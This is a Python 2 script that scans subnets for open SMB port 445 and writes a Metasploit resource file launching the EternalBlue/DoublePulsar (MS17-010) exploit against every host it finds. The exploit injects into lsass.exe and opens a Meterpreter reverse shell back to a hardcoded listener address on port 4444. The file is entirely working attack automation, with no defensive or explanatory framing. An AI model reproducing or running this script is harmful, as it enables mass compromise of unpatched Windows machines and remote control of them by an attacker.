#!/usr/bin/python

import nmap
import netaddr
import sys
import os
import optparse

def findTgts(nets,target_port):
    target_host_list=[]
    nmScan=nmap.PortScanner()
    print 'Staring Scan.....'
    nmScan.scan(hosts=nets, ports=str(target_port),arguments='--open -n')
    for subnet in nmScan.all_hosts():
        try:
            if nmScan[subnet]['tcp'][445]['state'] == 'open':
                target_host_list.append(subnet)
        except:
            continue
    return target_host_list

def setup_win_Handler(configFile,lhost):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set PAYLOAD windows/x64/meterpreter/reverse_tcp\n')
    configFile.write('set LHOST '+lhost+'\n')
    configFile.write('set LPORT 4444\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg disablepayloadhandler 1\n')

def setup_linux_Handler(configFile,lhost):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set PAYLOAD linux/x86/meterpreter/reverse_tcp\n')
    configFile.write('set LHOST '+str(lhost)+'\n')
    #configFile.write('set LPORT '+str(lport)+'\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')

def ms17_010(configFile,rhost,lhost):
    configFile.write('use exploit/windows/smb/eternalblue_doublepulsar\n')
    configFile.write('set TARGETARCHITECTURE x64\n')
    configFile.write('set PROCESSINJECT lsass.exe\n')
    configFile.write('set RHOST '+str(rhost)+'\n')
    configFile.write('set PAYLOAD windows/x64/meterpreter/reverse_tcp\n')
    configFile.write('set LHOST '+str(lhost)+'\n')
    configFile.write('set LPORT 4444\n')
    configFile.write('set target 9\n')
    configFile.write('exploit -z\n')

    

def attack_module_2():
    pass


def main():
    parser=optparse.OptionParser()
    parser.add_option('-n','--net',action='store',type='string',dest='nets')
    (options,args)=parser.parse_args()
    subnets=options.nets
    print subnets

    targets=findTgts(subnets,target_port='445')
    configFile=open('meta.rc','w')

    #setup_win_Handler(configFile,lhost='192.168.13.108')
    for target in targets:
        ms17_010(configFile,target,'192.168.13.108')

    configFile.close()

    #os.system('msfconsole -r meta.rc')


if __name__ == '__main__':
    main()
